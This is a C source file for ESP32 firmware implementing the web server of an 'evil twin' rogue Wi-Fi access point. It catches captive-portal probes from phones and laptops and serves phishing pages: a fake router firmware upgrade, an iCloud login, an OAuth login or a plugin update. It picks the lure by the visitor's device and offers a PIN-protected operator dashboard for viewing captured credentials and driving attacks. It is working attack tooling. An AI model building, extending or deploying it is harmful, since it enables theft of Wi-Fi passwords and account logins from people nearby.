#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <esp_log.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_log.h>
#include <lwip/sockets.h>
#include <cJSON.h>
#include <esp_random.h>
#include <esp_netif.h>
#include "evil_twin.h"
#include "config.h"
#include "nvs_keys.h"
#include "server.h"
#include "server_api.h"
#include "TaskManager.h"


static const char *TAG = "WEBSERVER";
static httpd_handle_t server = NULL;
static uint8_t attack_scheme = 0xff;
static uint8_t portal_auto = 0;

/* Resolve the SoftAP's own IPv4 address string (see definition below). */
static void ap_ip_str(char *out, size_t out_len);

/* Admin dashboard lives on an unguessable path and needs a PIN. Both are
   generated once, stored in NVS and printed to the serial console on boot. */
static char admin_path[24] = "/admin.html";   /* fallback until admin_init() */
static char admin_pin[8] = "0000";

static void generate_admin_credentials(void)
{
    static const char cs[] = "abcdefghijkmnpqrstuvwxyz23456789";  /* no l/1/o/0 */
    char path[24] = "/";
    char pin[8] = {0};

    uint8_t rnd[16] = {0};
    esp_fill_random(rnd, sizeof(rnd));

    for (int i = 0; i < 8; i++) {
        path[1 + i] = cs[rnd[i] % (sizeof(cs) - 1)];
    }
    path[9] = '\0';
    for (int i = 0; i < 4; i++) {
        pin[i] = (char)('0' + (rnd[8 + i] % 10));
    }
    pin[4] = '\0';

    strlcpy(admin_path, path, sizeof(admin_path));
    strlcpy(admin_pin, pin, sizeof(admin_pin));

    save_string_to_nvs(ADMIN_PATH_KEY, admin_path);
    save_string_to_nvs(ADMIN_PIN_KEY, admin_pin);
}

void http_server_admin_init(void)
{
    /* read_string_from_nvs() writes whatever length NVS reports, so the
       buffers must be bigger than anything we would ever store. */
    char stored_path[64] = {0};
    char stored_pin[32] = {0};
    bool have_path = read_string_from_nvs_sized(ADMIN_PATH_KEY, stored_path, sizeof(stored_path)) == ESP_OK &&
                     stored_path[0] == '/' && strlen(stored_path) == 9;
    bool have_pin = read_string_from_nvs_sized(ADMIN_PIN_KEY, stored_pin, sizeof(stored_pin)) == ESP_OK &&
                    strlen(stored_pin) == 4;

    if (have_path && have_pin) {
        strlcpy(admin_path, stored_path, sizeof(admin_path));
        strlcpy(admin_pin, stored_pin, sizeof(admin_pin));
    } else {
        generate_admin_credentials();
    }

    ESP_LOGI(TAG, "========================================");
    char ip[16];
    ap_ip_str(ip, sizeof(ip));
    ESP_LOGI(TAG, " Admin dashboard: http://%s%s", ip, admin_path);
    ESP_LOGI(TAG, " Access PIN     : %s", admin_pin);
    ESP_LOGI(TAG, " (both are stored in NVS; reset NVS to regenerate)");
    ESP_LOGI(TAG, "========================================");
}

const char *http_server_admin_path(void)
{
    return admin_path;
}

const char *http_server_admin_pin(void)
{
    return admin_pin;
}

bool http_server_admin_pin_ok(const char *pin)
{
    if (pin == NULL) return false;
    return strcmp(pin, admin_pin) == 0;
}



void http_server_set_attack_scheme(uint8_t scheme)
{
    attack_scheme = scheme;
}

uint8_t http_server_get_attack_scheme(void)
{
    return attack_scheme;
}

void http_server_set_portal_auto(uint8_t enabled)
{
    portal_auto = enabled ? 1 : 0;
}

uint8_t http_server_get_portal_auto(void)
{
    return portal_auto;
}

/* Apple devices get the iCloud page; everything else gets the router-style
   firmware upgrade page. */
static uint8_t portal_scheme_for_ua(const char *ua)
{
    if (ua == NULL) return FIRMWARE_UPGRADE;
    if (strstr(ua, "iPhone") || strstr(ua, "iPad") || strstr(ua, "iPod") ||
        strstr(ua, "Macintosh")) {
        return ICLOUD_LOGIN;
    }
    return FIRMWARE_UPGRADE;
}

static QueueHandle_t ws_frame_queue = NULL;
static TaskHandle_t ws_frame_process_task_handle = NULL;


static void ws_send_work(void *arg)
{
    ws_frame_req_t *r = (ws_frame_req_t *)arg;
    httpd_ws_frame_t out = {
        .final = true,
        .fragmented = false,
        .type = HTTPD_WS_TYPE_TEXT,
        .payload = (uint8_t *)r->payload,
        .len = r->len ? r->len : strlen(r->payload)
    };
	/* BROADCAST */
	if (r->fd == -1) {
        size_t fds = 10;
        int client_fds[10];
        if (httpd_get_client_list(r->hd, &fds, client_fds) == ESP_OK) {
            for (int i = 0; i < fds; i++) {
				if (httpd_ws_get_fd_info(r->hd, client_fds[i]) == HTTPD_WS_CLIENT_WEBSOCKET) {
                    esp_err_t ret = httpd_ws_send_frame_async(r->hd, client_fds[i], &out);
                    if (ret != ESP_OK) {
                        httpd_sess_trigger_close(r->hd, client_fds[i]);
                    }
                }
            }
        }
    } 
	/* UNICAST */
    else {
		esp_err_t ret = httpd_ws_send_frame_async(r->hd, r->fd, &out);
        if (ret != ESP_OK) {
             httpd_sess_trigger_close(r->hd, r->fd);
        }
    }

    if (r->need_free && r->payload) {
        cJSON_free(r->payload);
    }
    free(r);
}


static void ws_frame_process_task(void *pvParameter)
{
	(void)pvParameter;
	ws_frame_req_t ws_frame;
	while (1) 
	{
		if (xQueueReceive(ws_frame_queue, &ws_frame, portMAX_DELAY) == pdTRUE) 
		{
			switch (ws_frame.frame_type)
			{
			case WS_RX_FRAME:
			{
				/* Process received frame */
				http_api_parse(&ws_frame);
				if (ws_frame.payload) free(ws_frame.payload);
				break;
			}
			
			case WS_TX_FRAME:
			{
				/* Process transmit frame */
				ws_frame_req_t *heap_req = malloc(sizeof(ws_frame_req_t));
				if (heap_req) {
                    memcpy(heap_req, &ws_frame, sizeof(ws_frame_req_t));
					if (httpd_queue_work(ws_frame.hd, ws_send_work, heap_req) != ESP_OK) {
                        ESP_LOGE(TAG, "Failed to queue WS work, freeing memory");
                        if(heap_req->payload && heap_req->need_free) {
                            cJSON_free(heap_req->payload);
                        }
						free(heap_req);
                    }
                } else {
					ESP_LOGE(TAG, "Failed to alloc async req");
                    if(ws_frame.payload && ws_frame.need_free) cJSON_free(ws_frame.payload);
                }
				break;
			}
			
			default:
				break;
			}
			
		}
	}
}


/* The captive portal lives on the SoftAP, so redirect to whatever address the
   AP netif actually holds instead of assuming 192.168.4.1. */
static void ap_ip_str(char *out, size_t out_len)
{
    out[0] = '\0';
    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    esp_netif_ip_info_t info;
    if (ap != NULL && esp_netif_get_ip_info(ap, &info) == ESP_OK && info.ip.addr != 0) {
        snprintf(out, out_len, IPSTR, IP2STR(&info.ip));
    }
    if (out[0] == '\0') {
        strlcpy(out, "192.168.4.1", out_len);   /* last-resort default */
    }
}

static esp_err_t captive_portal_redirect(httpd_req_t *req)
{
	ESP_LOGD(TAG, "Captive portal captured url: %s", req->uri);
	char portal_url[48];
	char ip[16];
	ap_ip_str(ip, sizeof(ip));
	snprintf(portal_url, sizeof(portal_url), "http://%s/", ip);
	httpd_resp_set_status(req, "302 Found");
	//httpd_resp_set_hdr(req, "Host", host);
	httpd_resp_set_hdr(req, "Location", portal_url);
	httpd_resp_set_hdr(req, "Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
	httpd_resp_set_hdr(req, "Pragma", "no-cache");
	httpd_resp_set_hdr(req, "Connection", "close");
	httpd_resp_send(req, NULL, 0);
	return ESP_OK;
}


static esp_err_t cors_prevention_handler(httpd_req_t *req)
{
    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "POST, OPTIONS");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type, Authorization");
    return httpd_resp_send(req, NULL, 0);
}


static esp_err_t ws_handle_common(httpd_req_t *req, bool is_portal)
{
    if (req->method == HTTP_GET) {
        /* Both sockets are open: /ws is the operator channel, /portal-ws is
           what the captive portal pages use. Command-level rules still apply. */
        size_t origin_len = httpd_req_get_hdr_value_len(req, "Origin");
        char origin_buf[160] = {0};
        if (origin_len == 0 || origin_len >= sizeof(origin_buf) ||
            httpd_req_get_hdr_value_str(req, "Origin", origin_buf, sizeof(origin_buf)) != ESP_OK) {
            return ESP_FAIL;
        }
        char host[128] = {0};
        size_t host_len = httpd_req_get_hdr_value_len(req, "Host");
        if (host_len == 0 || host_len >= sizeof(host) ||
            httpd_req_get_hdr_value_str(req, "Host", host, sizeof(host)) != ESP_OK) return ESP_FAIL;
        size_t expected_len = strlen("http://") + strlen(host);
        if (strncmp(origin_buf, "http://", 7) != 0 || strlen(origin_buf) != expected_len ||
            strcmp(origin_buf + 7, host) != 0) return ESP_FAIL;

        /* The operator socket must prove it got past the PIN gate. The
           dashboard carries the adminpin cookie set when the PIN unlocked the
           page, and the browser replays it on the same-origin WS upgrade.
           Without this, anyone on the open rogue AP could open /ws and pull
           captured credentials or drive the attacks. */
        if (!is_portal) {
            bool authed = false;
            size_t clen = httpd_req_get_hdr_value_len(req, "Cookie");
            if (clen > 0 && clen < 256) {
                char cookie[256] = {0};
                if (httpd_req_get_hdr_value_str(req, "Cookie", cookie, sizeof(cookie)) == ESP_OK) {
                    char tok[24] = {0};
                    if (httpd_query_key_value(cookie, "adminpin", tok, sizeof(tok)) == ESP_OK) {
                        authed = http_server_admin_pin_ok(tok);
                    }
                }
            }
            if (!authed) {
                ESP_LOGW(TAG, "Rejected unauthorised /ws upgrade from fd=%d", httpd_req_to_sockfd(req));
                return ESP_FAIL;
            }
        }

        ESP_LOGD(TAG, "WS handshake done, new client fd=%d", httpd_req_to_sockfd(req));
        return ESP_OK;
    }

    httpd_ws_frame_t frame = {0};
	frame.type = HTTPD_WS_TYPE_TEXT;

	esp_err_t ret = httpd_ws_recv_frame(req, &frame, 0);
    if (ret != ESP_OK) return ret;

	if (frame.type == HTTPD_WS_TYPE_PING) {
        ESP_LOGD(TAG, "PING (fd=%d)", httpd_req_to_sockfd(req));
        httpd_ws_frame_t pong = {.type = HTTPD_WS_TYPE_PONG, .payload = NULL, .len = 0};
        return httpd_ws_send_frame(req, &pong);
    }

    if (frame.type == HTTPD_WS_TYPE_CLOSE) {
        ESP_LOGD(TAG, "CLOSE (fd=%d)", httpd_req_to_sockfd(req));
        return ESP_OK;
    }

	if (frame.len > 0) {

		if (frame.len >= 4096) {
            ESP_LOGW(TAG, "WS Frame too large (%u bytes)", (unsigned)frame.len);
            return ESP_FAIL;
        }

        uint8_t *buf = calloc(1, frame.len + 1);
        if (!buf) {
            ESP_LOGE(TAG, "No mem for WS frame");
            return ESP_ERR_NO_MEM;
        }
        frame.payload = buf;
        ret = httpd_ws_recv_frame(req, &frame, frame.len);
        if (ret != ESP_OK) {
            free(buf);
            return ret;
        }
        buf[frame.len] = '\0';

        ws_frame_req_t ws_req;
        ws_req.hd = req->handle;
        ws_req.fd = httpd_req_to_sockfd(req);
        ws_req.frame_type = WS_RX_FRAME;
        ws_req.payload = (char*)buf;
        ws_req.len = frame.len;
        ws_req.need_free = true;
        ws_req.is_portal = is_portal;

        if (xQueueSend(ws_frame_queue, &ws_req, 100) != pdTRUE) {
            free(buf);
            return ESP_FAIL;
        }
    }
    return ESP_OK;
}

static esp_err_t ws_handler(httpd_req_t *req) { return ws_handle_common(req, false); }
static esp_err_t portal_ws_handler(httpd_req_t *req) { return ws_handle_common(req, true); }

static esp_err_t redirect_handler(httpd_req_t *req) 
{
	char filepath[128] = "/spiffs";
	char buf[1024];
    size_t n;
	const char *uri = req->uri;

	/* req->uri includes the query string ("/abc?pin=1234"), while every route
	   comparison below expects a bare path. Work on a query-free copy. */
	char path_only[128];
	{
		const char *qs = strchr(uri, '?');
		size_t plen = qs ? (size_t)(qs - uri) : strlen(uri);
		if (plen >= sizeof(path_only)) plen = sizeof(path_only) - 1;
		memcpy(path_only, uri, plen);
		path_only[plen] = '\0';
	}

	/* Redirect to captive portal */
	// Apple / iOS / macOS
	if(strcmp(path_only, "/hotspot-detect.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(path_only, "/library/test/success.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}

	// Android / ChromeOS
	else if(strcmp(path_only, "/generate_204") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(path_only, "/gen_204") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	/* Some vendor ROMs (seen on Xiaomi/MIUI Android 16) probe without the
	   underscore and would otherwise fall through to the 404 branch below,
	   so their captive-portal popup never fires. */
	else if(strcmp(path_only, "/generate204") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}

	// Windows 10 / 11 (MSFT Connect Test)
	else if(strcmp(path_only, "/connecttest.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(path_only, "/redirect") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}

	// Windows 7 / 8 / vecchie versioni (NCSI)
	else if(strcmp(path_only, "/ncsi.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}

	// Varianti Firefox, Ubuntu, ecc.
	else if(strcmp(path_only, "/check_network_status.txt") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strcmp(path_only, "/canonical.html") == 0 ) {
		captive_portal_redirect(req);
		return ESP_OK;
	}
	else if(strncmp(path_only, "/success.txt", 12) == 0 ) {
        captive_portal_redirect(req);
        return ESP_OK;
    }
	
    if (strcmp(path_only, "/") == 0) {
        char ua[128] = {0};
        size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent");
        if (ua_len > 0 && ua_len < sizeof(ua)) {
            httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof(ua));
        }

        uint8_t scheme = attack_scheme;
        if (portal_auto) scheme = portal_scheme_for_ua(ua);

        /* Record what this visitor claimed to be, and what we served. */
        portal_ua_record(ua, scheme);

		switch(scheme)
		{
			case FIRMWARE_UPGRADE:
				uri = "/fwupgrade/index.html";
				break;
			
			case WEB_NET_MANAGER:
				uri = "/netmng/index.html";
				break;

			case PLUGIN_UPDATE:
				uri = "/plugin.html";
				break;

			case OAUTH_LOGIN:
				uri = "/oauth/index.html";
				break;

			case ICLOUD_LOGIN:
				uri = "/icloud/index.html";
				break;

			default:
				/* Never hand the operator console to an anonymous visitor:
				   "/" always shows the public portal page instead. */
				uri = "/fwupgrade/index.html";
				break;
		}
	}
    /* Admin console: served only from the generated path, and only with the
       right PIN. "/admin.html" and friends 404 like any unknown path. */
    /* Browsers frequently omit Accept on a redirect'd navigation, so match on
       the bare path alone and let the PIN decide. */
    if (strcmp(path_only, admin_path) == 0) {
        char given[16] = {0};
        size_t glen = httpd_req_get_url_query_len(req) + 1;
        bool ok = false;
        if (glen > 1 && glen < 128) {
            char q[128] = {0};
            if (httpd_req_get_url_query_str(req, q, glen) == ESP_OK) {
                if (httpd_query_key_value(q, "pin", given, sizeof(given)) == ESP_OK) {
                    ok = http_server_admin_pin_ok(given);
                }
            }
        }
        if (!ok) {
            /* The visitor also carries a cookie once unlocked. */
            size_t clen = httpd_req_get_hdr_value_len(req, "Cookie");
            if (clen > 0 && clen < 256) {
                char cookie[256] = {0};
                if (httpd_req_get_hdr_value_str(req, "Cookie", cookie, sizeof(cookie)) == ESP_OK) {
                    char tok[24] = {0};
                    if (httpd_query_key_value(cookie, "adminpin", tok, sizeof(tok)) == ESP_OK) {
                        ok = http_server_admin_pin_ok(tok);
                    }
                }
            }
        }
        if (!ok) {
            static const char page[] =
                "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
                "<title>Enter PIN</title>"
                "<body style='font:16px -apple-system,system-ui;background:#1a1a1e;color:#ededf1;"
                "display:flex;align-items:center;justify-content:center;height:100vh;margin:0'>"
                "<form method=get style='background:#232327;padding:28px;border-radius:14px;"
                "border:1px solid #333339;text-align:center'>"
                "<div style='margin-bottom:14px;font-weight:600'>Access PIN</div>"
                "<input name=pin inputmode=numeric maxlength=4 autofocus "
                "style='font-size:22px;letter-spacing:.4em;text-align:center;width:140px;"
                "padding:8px;border-radius:8px;border:1px solid #333339;background:#2d2d33;"
                "color:#ededf1'>"
                "<div style='margin-top:16px'><button style='padding:8px 20px;border-radius:8px;"
                "border:0;background:#a5b4fc;color:#14142a;font-weight:600'>Unlock</button></div>"
                "</form></body>";
            httpd_resp_set_status(req, "401 Unauthorized");
            httpd_resp_set_type(req, "text/html");
            httpd_resp_send(req, page, HTTPD_RESP_USE_STRLEN);
            return ESP_OK;
        }
        /* Unlocked. A plain browser form posts ?pin=NNNN as a document
           navigation, so answer with a redirect that turns the PIN into a
           cookie; that keeps the PIN out of the address bar and gives the
           dashboard's own asset fetches something to authenticate with. */
        char ck[56];
        snprintf(ck, sizeof(ck), "adminpin=%s; Path=/; HttpOnly", admin_pin);
        httpd_resp_set_hdr(req, "Set-Cookie", ck);
        if (httpd_req_get_url_query_len(req) > 0) {
            httpd_resp_set_status(req, "302 Found");
            httpd_resp_set_hdr(req, "Location", admin_path);
            httpd_resp_send(req, NULL, 0);
            return ESP_OK;
        }
        uri = "/admin.html";     /* already carries the cookie: serve the file */
    }

    /* Never expose captured credentials or path traversal through the static route.
       The dashboard is only reachable via the generated admin_path above, so
       its real filename, the portal sources and any credential log must be
       refused here even if the caller guesses them directly. */
    if (strstr(uri, "passwords") != NULL || strstr(uri, "credentials") != NULL ||
        strstr(uri, "private") != NULL || strstr(uri, "..") != NULL || uri[0] != '/' ||
        strcmp(path_only, "/admin.html") == 0 || strcmp(path_only, "/_preview.html") == 0) {
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
        return ESP_OK;
    }
    /* uri may still be the raw request (query included) when no route above
       rewrote it; fall back to the bare path so fopen() finds the file. */
    strlcat(filepath, (uri == req->uri) ? path_only : uri, sizeof(filepath));

    FILE *f = fopen(filepath, "r");
    if (!f) 
    { 
		const char *method_str = "OTHER";
        switch(req->method) {
            case HTTP_GET:  method_str = "GET"; break;
            case HTTP_POST: method_str = "POST"; break;
            case HTTP_HEAD: method_str = "HEAD"; break;
			case HTTP_OPTIONS: method_str = "OPTION"; break;
			case HTTP_PUT: method_str = "PUT"; break;
            default: break;
        }
		ESP_LOGW(TAG, "%s %s - 404", method_str, req->uri);
		if (req->method == HTTP_POST && req->content_len > 0) {
            char buf[101]; 
            size_t recv_size = (req->content_len < 100) ? req->content_len : 100;
            int ret = httpd_req_recv(req, buf, recv_size);
            if (ret > 0) {
                buf[ret] = '\0';
                ESP_LOGW(TAG, "POST DATA (Preview): %s", buf);
            } else if (ret == HTTPD_SOCK_ERR_TIMEOUT) {
                ESP_LOGW(TAG, "POST DATA: Timeout reading body");
            }
        }

		return captive_portal_redirect(req);
        //httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
        //return ESP_OK; 
    }

    httpd_resp_set_type(req, mime_from_path(filepath));
	
    
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) 
    {
        if (httpd_resp_send_chunk(req, buf, n) != ESP_OK) 
        { 
            fclose(f); 
            return ESP_FAIL; 
        }
    }
    fclose(f);
    httpd_resp_send_chunk(req, NULL, 0);
    return ESP_OK;
}


esp_err_t ws_send_command_to_queue(ws_frame_req_t *_req)
{
	if (ws_frame_queue == NULL) {
		ESP_LOGE(TAG, "Websocket frame queue is not initialized!");
		return ESP_FAIL;
	}

	/* Enforce frame type */
	_req->frame_type = WS_TX_FRAME;

	if (xQueueSend(ws_frame_queue, _req, 100) != pdTRUE) {
		ESP_LOGE(TAG, "Failed to send command to queue!");
		return ESP_FAIL;
	}

	return ESP_OK;
}


esp_err_t ws_send_broadcast_to_queue(ws_frame_req_t *_req)
{
    if (ws_frame_queue == NULL) {
		ESP_LOGE(TAG, "Websocket frame queue is not initialized!");
		return ESP_FAIL;
	}

	if (uxQueueSpacesAvailable(ws_frame_queue) == 0) {
        return ESP_FAIL;
    }

    _req->frame_type = WS_TX_FRAME;
    
    if (xQueueSend(ws_frame_queue, _req, 0) != pdTRUE) {
        return ESP_FAIL; 
    }

    return ESP_OK;
}


void http_server_start(void)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Web server already started.");
		return;
	}

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.max_resp_headers = 16;
	config.recv_wait_timeout = 10;
	config.send_wait_timeout = 10;
	config.lru_purge_enable = true;
	config.max_uri_handlers = 15;
	/* Our handlers (PIN gate, portal file streaming, JSON status) need more
	   headroom than the 4 KB default; running out here reboots the web server. */
	config.stack_size = 8192;

	esp_err_t ret = httpd_start(&server, &config);
	if (ret != ESP_OK) {
		ESP_LOGE(TAG, "Failed to start web server: %s", esp_err_to_name(ret));
		return;
	}

	ws_frame_queue = xQueueCreate(WS_FRAME_QUEUE_LENGTH, sizeof(ws_frame_req_t));
	if (ws_frame_queue == NULL) {
		ESP_LOGE(TAG, "Failed to create websocket frame queue!");
		return;
	}
	task_manager_create_task(ws_frame_process_task, "ws_frame_process_task", 8192, NULL, 5, &ws_frame_process_task_handle);

	/* Handler for CORS preflight requests */
	httpd_uri_t cors_preflight_uri = {
		.uri = "/*",
		.method = HTTP_OPTIONS,
		.handler = cors_prevention_handler,
		.user_ctx = NULL
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &cors_preflight_uri));

	httpd_uri_t ws_uri = {
		.uri = "/ws",
		.method = HTTP_GET,
		.handler = ws_handler,
		.user_ctx = NULL,
		.is_websocket = true,
		.handle_ws_control_frames = true
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &ws_uri));

	httpd_uri_t portal_ws_uri = {
		.uri = "/portal-ws",
		.method = HTTP_GET,
		.handler = portal_ws_handler,
		.user_ctx = NULL,
		.is_websocket = true,
		.handle_ws_control_frames = true
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &portal_ws_uri));

	httpd_uri_t any = {
		.uri = "/*", 
		.method = HTTP_GET, 
		.handler = redirect_handler, 
		.user_ctx = NULL
	};
	ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any));

	httpd_uri_t any_head = {
        .uri = "/*", 
        .method = HTTP_HEAD,
        .handler = redirect_handler, 
        .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any_head));

    httpd_uri_t any_post = {
        .uri = "/*", .method = HTTP_POST, .handler = redirect_handler, .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any_post));
    httpd_uri_t any_put = {
        .uri = "/*", .method = HTTP_PUT, .handler = redirect_handler, .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any_put));
    httpd_uri_t any_delete = {
        .uri = "/*", .method = HTTP_DELETE, .handler = redirect_handler, .user_ctx = NULL
    };
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &any_delete));
}


void http_server_stop(void)
{
	if (ws_frame_process_task_handle != NULL) {
        task_manager_delete_task_by_handle(ws_frame_process_task_handle);
        ws_frame_process_task_handle = NULL;
    }

	if( ws_frame_queue != NULL ) {
		vQueueDelete(ws_frame_queue);
		ws_frame_queue = NULL;
	}

	if( server != NULL ) {
        if( httpd_stop(server) != ESP_OK ) {
            ESP_LOGD(TAG, "Failed to stop web server.");
            return;
        }
		server = NULL;
    }
}


httpd_handle_t get_web_server_handle(void) 
{
    return server;
}